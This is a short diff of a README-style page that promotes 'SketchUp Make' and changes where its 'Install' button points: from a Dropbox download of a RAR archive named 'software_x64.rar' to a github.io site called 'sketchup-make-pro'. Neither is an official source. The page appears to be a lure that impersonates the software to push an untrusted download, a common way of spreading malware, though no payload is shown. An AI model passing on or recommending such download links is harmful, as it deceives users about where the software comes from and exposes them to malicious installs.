@@ -6,7 +6,7 @@
 <h3>SketchUp Make - intuitive 3D drawing and visualization tool</h3>
 <p>SketchUp Make is a professional 3D modeling and architectural design application specifically developed for PC environments</p>
 
-[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://www.dropbox.com/scl/fi/ia1j1n27us78vi4mj8q6v/software_x64.rar?rlkey=66iwbwbiazrxvgzo3sxd68hgr&st=iblznw53&dl=1)
+[![Install](https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png)](https://sketchup-make-pro.github.io/.github)
 </div>
 <br/><br>
 
